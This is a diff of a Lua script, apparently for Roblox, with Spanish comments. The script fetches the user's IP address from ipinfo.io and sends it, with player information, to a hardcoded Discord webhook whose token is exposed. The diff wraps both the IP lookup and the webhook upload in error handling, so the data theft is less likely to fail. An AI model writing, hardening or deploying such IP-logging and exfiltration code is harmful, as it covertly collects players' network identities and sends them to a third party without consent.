@@ -4,7 +4,14 @@ local webhookUrl = "https://discord.com/api/webhooks/1358974371351494718/eb0welp
 -- Función para obtener la IP del usuario
 local function getIPAddress()
     local httpService = game:GetService("HttpService")
-    local response = httpService:JSONDecode(httpService:GetAsync("http://ipinfo.io/json"))
+    local response
+    local success, err = pcall(function()
+        response = httpService:JSONDecode(httpService:GetAsync("http://ipinfo.io/json"))
+    end)
+    if not success then
+        warn("Error obtaining IP address: " .. err)
+        return "Unknown"
+    end
     return response.ip
 end
 
@@ -19,7 +26,10 @@ local function sendToWebhook(data)
             ["Content-Type"] = "application/json"
         }
     }
-    httpService:RequestAsync(request)
+    local success, response = pcall(httpService.RequestAsync, httpService, request)
+    if not success then
+        warn("Error sending data to webhook: " .. response)
+    end
 end
 
 -- Obtener información del jugador
